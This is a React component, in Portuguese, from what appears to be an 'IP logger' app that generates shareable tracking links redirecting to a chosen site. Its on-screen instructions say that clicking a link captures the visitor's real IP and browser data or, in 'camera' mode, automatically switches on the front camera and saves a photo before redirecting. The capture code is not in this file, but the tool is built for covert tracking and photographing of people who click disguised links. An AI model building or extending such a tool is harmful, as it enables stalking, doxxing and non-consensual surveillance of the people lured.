
import React, { useState } from 'react';
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Label } from '@/components/ui/label';
import { ArrowLeft, Copy, Link, RefreshCw, ExternalLink, Camera, Wifi } from 'lucide-react';
import { useToast } from '@/hooks/use-toast';

interface LinkGeneratorProps {
  onBack: () => void;
}

const LinkGenerator: React.FC<LinkGeneratorProps> = ({ onBack }) => {
  const [linkId, setLinkId] = useState('');
  const [redirectUrl, setRedirectUrl] = useState('https://google.com');
  const [linkType, setLinkType] = useState<'ip' | 'camera'>('ip');
  const { toast } = useToast();

  const generateRandomId = () => {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    let result = '';
    for (let i = 0; i < 8; i++) {
      result += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return result;
  };

  const generateLink = () => {
    const newId = generateRandomId();
    setLinkId(newId);
    
    // Salvar a URL de redirecionamento e tipo associado ao linkId
    const savedLinks = localStorage.getItem('iplogger-links');
    const links = savedLinks ? JSON.parse(savedLinks) : {};
    links[newId] = {
      redirectUrl,
      type: linkType
    };
    localStorage.setItem('iplogger-links', JSON.stringify(links));
    
    toast({
      title: "Link Gerado!",
      description: `Seu link de rastreamento ${linkType === 'camera' ? 'com câmera' : 'de IP'} foi criado com sucesso.`,
    });
  };

  const copyToClipboard = (text: string) => {
    navigator.clipboard.writeText(text).then(() => {
      toast({
        title: "Copiado!",
        description: "Link copiado para a área de transferência.",
      });
    });
  };

  const testLink = () => {
    if (linkId) {
      window.open(`${window.location.origin}/r/${linkId}`, '_blank');
    }
  };

  const trackingUrl = linkId ? `${window.location.origin}/r/${linkId}` : '';

  return (
    <div className="min-h-screen p-4">
      <div className="max-w-md mx-auto space-y-6">
        {/* Header */}
        <div className="flex items-center space-x-4">
          <Button
            onClick={onBack}
            variant="ghost"
            size="sm"
            className="text-white hover:bg-gray-800"
          >
            <ArrowLeft className="h-4 w-4" />
          </Button>
          <h1 className="text-xl font-bold text-white">Gerar Link</h1>
        </div>

        {/* Link Type Selection */}
        <Card className="bg-gray-800 border-gray-700">
          <CardHeader>
            <CardTitle className="text-white">Tipo de Rastreamento</CardTitle>
          </CardHeader>
          <CardContent className="space-y-4">
            <div className="flex space-x-2">
              <Button
                onClick={() => setLinkType('ip')}
                variant={linkType === 'ip' ? 'default' : 'outline'}
                className={`flex-1 ${linkType === 'ip' ? 'bg-blue-600 hover:bg-blue-700' : 'border-gray-600 text-gray-300'}`}
              >
                <Wifi className="mr-2 h-4 w-4" />
                Link IP
              </Button>
              <Button
                onClick={() => setLinkType('camera')}
                variant={linkType === 'camera' ? 'default' : 'outline'}
                className={`flex-1 ${linkType === 'camera' ? 'bg-purple-600 hover:bg-purple-700' : 'border-gray-600 text-gray-300'}`}
              >
                <Camera className="mr-2 h-4 w-4" />
                Câmera
              </Button>
            </div>
            <div className="text-sm text-gray-400">
              {linkType === 'ip' 
                ? 'Captura apenas dados de IP e navegador'
                : 'Captura foto da câmera frontal + dados de IP'
              }
            </div>
          </CardContent>
        </Card>

        {/* Configuration */}
        <Card className="bg-gray-800 border-gray-700">
          <CardHeader>
            <CardTitle className="text-white flex items-center space-x-2">
              <Link className="h-5 w-5 text-blue-400" />
              <span>Configuração do Link</span>
            </CardTitle>
          </CardHeader>
          <CardContent className="space-y-4">
            <div>
              <Label htmlFor="redirect" className="text-gray-300">
                URL de Redirecionamento
              </Label>
              <Input
                id="redirect"
                value={redirectUrl}
                onChange={(e) => setRedirectUrl(e.target.value)}
                placeholder="https://google.com"
                className="bg-gray-700 border-gray-600 text-white mt-1"
              />
            </div>

            <Button
              onClick={generateLink}
              className="w-full bg-blue-600 hover:bg-blue-700"
            >
              <RefreshCw className="mr-2 h-4 w-4" />
              Gerar Novo Link
            </Button>
          </CardContent>
        </Card>

        {/* Generated Link */}
        {linkId && (
          <Card className="bg-gray-800 border-gray-700">
            <CardHeader>
              <CardTitle className="text-white flex items-center space-x-2">
                {linkType === 'camera' ? (
                  <Camera className="h-5 w-5 text-purple-400" />
                ) : (
                  <Wifi className="h-5 w-5 text-blue-400" />
                )}
                <span>Link de Rastreamento</span>
              </CardTitle>
            </CardHeader>
            <CardContent className="space-y-4">
              <div className="bg-gray-900 p-3 rounded border border-gray-600">
                <code className={`${linkType === 'camera' ? 'text-purple-400' : 'text-green-400'} text-sm break-all`}>
                  {trackingUrl}
                </code>
              </div>

              <div className="flex space-x-2">
                <Button
                  onClick={() => copyToClipboard(trackingUrl)}
                  className="flex-1 bg-gray-700 hover:bg-gray-600"
                >
                  <Copy className="mr-2 h-4 w-4" />
                  Copiar
                </Button>
                <Button
                  onClick={testLink}
                  className="flex-1 bg-green-600 hover:bg-green-700"
                >
                  <ExternalLink className="mr-2 h-4 w-4" />
                  Testar
                </Button>
              </div>
            </CardContent>
          </Card>
        )}

        {/* Instructions */}
        <Card className="bg-gray-800 border-gray-700">
          <CardHeader>
            <CardTitle className="text-white">Como Usar</CardTitle>
          </CardHeader>
          <CardContent className="text-gray-300 text-sm space-y-2">
            <p>1. Escolha o tipo: Link IP ou Câmera</p>
            <p>2. Configure a URL de redirecionamento</p>
            <p>3. Clique em "Gerar Novo Link"</p>
            <p>4. Compartilhe o link gerado</p>
            {linkType === 'camera' ? (
              <>
                <p>5. Quando alguém clicar, a câmera será ativada automaticamente</p>
                <p>6. Foto será capturada e salva junto com os dados</p>
              </>
            ) : (
              <p>5. Quando alguém clicar, os dados REAIS serão capturados</p>
            )}
            <p>7. O usuário será redirecionado automaticamente</p>
          </CardContent>
        </Card>
      </div>
    </div>
  );
};

export default LinkGenerator;
